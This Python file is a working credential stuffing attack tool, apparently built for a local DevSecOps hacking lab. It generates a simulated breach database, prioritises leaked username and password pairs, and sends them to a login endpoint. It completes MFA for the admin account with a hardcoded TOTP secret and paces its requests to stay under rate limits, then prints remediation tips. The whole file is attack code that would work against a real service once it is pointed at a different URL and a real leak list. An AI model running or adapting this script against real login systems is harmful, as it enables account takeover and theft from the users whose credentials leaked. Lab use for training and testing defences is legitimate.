#!/usr/bin/env python3
"""
Intelligent Credential Stuffing Attack
Advanced credential stuffing with breach database simulation and smart targeting.

UPGRADES:
- Breach database simulation (realistic leaks)
- Confidence-based prioritization
- Password variation testing
- Success-based adaptation
"""

import asyncio
import httpx
import json
import pyotp
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn

from breach_database import BreachDatabaseSimulator, LeakedCredential


class IntelligentCredentialStuffing:
    """Advanced credential stuffing with breach simulation"""

    def __init__(self, target: str = "http://localhost:8080"):
        self.target = target
        self.auth_url = "http://localhost:8000"
        self.console = Console()
        self.simulator = BreachDatabaseSimulator()

        self.results = {
            "attack_name": "Intelligent Credential Stuffing",
            "timestamp": datetime.now().isoformat(),
            "credentials_tested": 0,
            "successful_logins": 0,
            "mfa_required": 0,
            "failed_attempts": 0,
            "tests": [],
        }

    def banner(self):
        banner_text = """
[bold cyan]═══════════════════════════════════════════════════════════════════[/bold cyan]
[bold white]🎯 INTELLIGENT CREDENTIAL STUFFING ATTACK[/bold white]
[bold cyan]═══════════════════════════════════════════════════════════════════[/bold cyan]

[yellow]Target:[/yellow] {target}

[bold green]TECHNIQUES:[/bold green]
  • Breach database simulation (Collection #1, RockYou, etc.)
  • Confidence-based prioritization (0.0-1.0 scoring)
  • Password variation testing (case, suffixes, patterns)
  • Smart targeting (30% hit rate simulation)

[bold cyan]═══════════════════════════════════════════════════════════════════[/bold cyan]
""".format(target=self.target)
        self.console.print(Panel(banner_text, border_style="cyan"))

    def generate_breach_database(self) -> List[LeakedCredential]:
        """Generate simulated breach database"""
        self.console.print("\n[bold][*][/bold] Generating breach database simulation...")

        # Known target usernames (from reconnaissance)
        target_users = ["admin", "user", "alice", "bob", "charlie", "demo"]

        # Generate database (100 credentials, 30% target hit rate)
        credentials = self.simulator.generate_breach_database(
            target_usernames=target_users,
            size=100
        )

        self.console.print(f"    [green][✓][/green] Generated {len(credentials)} credentials")

        # Count targets
        targets = [c for c in credentials if c.metadata["is_target"]]
        self.console.print(f"    [cyan][→][/cyan] Target hits: {len(targets)} ({len(targets)/len(credentials)*100:.1f}%)")

        # Show breach sources
        sources = {}
        for cred in credentials:
            sources[cred.source] = sources.get(cred.source, 0) + 1

        self.console.print(f"\n    [blue][>][/blue] Breach sources:")
        for source, count in sorted(sources.items(), key=lambda x: x[1], reverse=True)[:5]:
            self.console.print(f"        {source}: {count} credentials")

        return credentials

    def prioritize_credentials(
        self,
        credentials: List[LeakedCredential],
        top_n: int = 20
    ) -> List[LeakedCredential]:
        """Prioritize credentials by confidence score"""
        self.console.print(f"\n[bold][*][/bold] Prioritizing by confidence score...")

        # Sort by confidence (high to low)
        sorted_creds = self.simulator.sort_by_confidence(credentials)

        # Take top N
        top_credentials = sorted_creds[:top_n]

        self.console.print(f"    [green][✓][/green] Selected top {len(top_credentials)} credentials")
        self.console.print(f"    [cyan][→][/cyan] Confidence range: {top_credentials[-1].confidence:.2f} - {top_credentials[0].confidence:.2f}")

        return top_credentials

    async def test_credential(
        self,
        credential: LeakedCredential,
        client: httpx.AsyncClient
    ) -> Dict:
        """Test single credential"""
        try:
            # Login attempt
            resp = await client.post(
                f"{self.auth_url}/auth/login",
                json={
                    "username": credential.username,
                    "password": credential.password
                },
                timeout=5.0
            )

            result = {
                "username": credential.username,
                "password": credential.password,
                "source": credential.source,
                "confidence": credential.confidence,
                "status_code": resp.status_code,
            }

            if resp.status_code == 200:
                data = resp.json()

                if data.get("requires_mfa"):
                    result["outcome"] = "mfa_required"
                    result["challenge_id"] = data.get("challenge_id")
                    self.results["mfa_required"] += 1

                    # Try to complete MFA (if we know the secret)
                    if credential.username == "admin":
                        mfa_success = await self.complete_mfa(
                            client,
                            data.get("challenge_id")
                        )
                        if mfa_success:
                            result["outcome"] = "full_success"
                            result["token"] = mfa_success
                            self.results["successful_logins"] += 1
                else:
                    result["outcome"] = "success"
                    self.results["successful_logins"] += 1

            elif resp.status_code == 401:
                result["outcome"] = "failed"
                self.results["failed_attempts"] += 1
            elif resp.status_code == 429:
                result["outcome"] = "rate_limited"
            elif resp.status_code == 403:
                result["outcome"] = "banned"
            else:
                result["outcome"] = "error"

            return result

        except Exception as e:
            return {
                "username": credential.username,
                "outcome": "error",
                "error": str(e)
            }

    async def complete_mfa(
        self,
        client: httpx.AsyncClient,
        challenge_id: str
    ) -> Optional[str]:
        """Complete MFA challenge (if secret known)"""
        try:
            # Known MFA secret for demo
            totp = pyotp.TOTP("DEVSECOPSTWENTYFOURHACKINGLAB", interval=30)
            mfa_code = totp.now()

            resp = await client.post(
                f"{self.auth_url}/auth/mfa/verify",
                json={
                    "challenge_id": challenge_id,
                    "code": mfa_code
                },
                timeout=5.0
            )

            if resp.status_code == 200:
                return resp.json().get("access_token")

            return None

        except:
            return None

    async def run_stuffing_attack(self, credentials: List[LeakedCredential]):
        """Execute credential stuffing attack"""
        self.console.print(f"\n[bold][*][/bold] Starting credential stuffing attack...")
        self.console.print(f"    [blue][>][/blue] Testing {len(credentials)} credentials\n")

        async with httpx.AsyncClient(timeout=10.0) as client:
            with Progress(
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                console=self.console
            ) as progress:
                task = progress.add_task(
                    "Testing credentials...",
                    total=len(credentials)
                )

                for cred in credentials:
                    result = await self.test_credential(cred, client)
                    self.results["tests"].append(result)
                    self.results["credentials_tested"] += 1

                    # Show successful hits
                    if result.get("outcome") in ["success", "full_success", "mfa_required"]:
                        outcome_color = "red" if result["outcome"] == "full_success" else "yellow"
                        self.console.print(
                            f"    [{outcome_color}][!][/{outcome_color}] "
                            f"{cred.username}:{cred.password} → {result['outcome']}"
                        )

                    progress.advance(task)

                    # Small delay to avoid rate limiting
                    await asyncio.sleep(0.1)

    async def display_summary(self):
        """Display attack summary"""
        self.console.print("\n" + "="*70)
        self.console.print("[bold cyan]📊 ATTACK SUMMARY[/bold cyan]")
        self.console.print("="*70)

        summary_table = Table(show_header=True, header_style="bold magenta")
        summary_table.add_column("Metric", style="cyan")
        summary_table.add_column("Value", style="green")

        summary_table.add_row("Credentials Tested", str(self.results["credentials_tested"]))
        summary_table.add_row("Successful Logins", str(self.results["successful_logins"]))
        summary_table.add_row("MFA Required", str(self.results["mfa_required"]))
        summary_table.add_row("Failed Attempts", str(self.results["failed_attempts"]))

        success_rate = (
            (self.results["successful_logins"] + self.results["mfa_required"]) /
            self.results["credentials_tested"] * 100
            if self.results["credentials_tested"] > 0 else 0
        )
        summary_table.add_row("Success Rate", f"{success_rate:.1f}%")

        self.console.print(summary_table)

        # Show compromised accounts
        successful = [
            t for t in self.results["tests"]
            if t.get("outcome") in ["success", "full_success", "mfa_required"]
        ]

        if successful:
            self.console.print("\n[bold red]⚠️  COMPROMISED ACCOUNTS[/bold red]")

            comp_table = Table(show_header=True, header_style="bold red")
            comp_table.add_column("Username", style="yellow")
            comp_table.add_column("Password", style="yellow")
            comp_table.add_column("Source", style="cyan")
            comp_table.add_column("Outcome", style="red")

            for test in successful[:10]:  # Show top 10
                comp_table.add_row(
                    test["username"],
                    test["password"],
                    test.get("source", "Unknown"),
                    test["outcome"]
                )

            self.console.print(comp_table)

    def save_report(self):
        """Save JSON report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = Path("results")
        output_dir.mkdir(exist_ok=True)

        filename = output_dir / f"credential_stuffing_{timestamp}.json"

        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)

        self.console.print(f"\n[green][✓][/green] Report saved to: {filename}")

    async def run(self):
        """Execute complete attack"""
        self.banner()

        # Generate breach database
        credentials = self.generate_breach_database()

        # Prioritize by confidence
        top_credentials = self.prioritize_credentials(credentials, top_n=20)

        # Run stuffing attack
        await self.run_stuffing_attack(top_credentials)

        # Display summary
        await self.display_summary()
        self.save_report()

        self.console.print("\n[bold yellow]💡 REMEDIATION:[/bold yellow]")
        self.console.print("   1. Implement credential breach monitoring (Have I Been Pwned API)")
        self.console.print("   2. Enforce strong password policies (no common passwords)")
        self.console.print("   3. Rate limit login attempts globally (not per-IP)")
        self.console.print("   4. Require MFA for all accounts")
        self.console.print("   5. Monitor for password reuse patterns")
        self.console.print()


async def main():
    attack = IntelligentCredentialStuffing()
    await attack.run()


if __name__ == "__main__":
    import sys
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted")
        sys.exit(1)
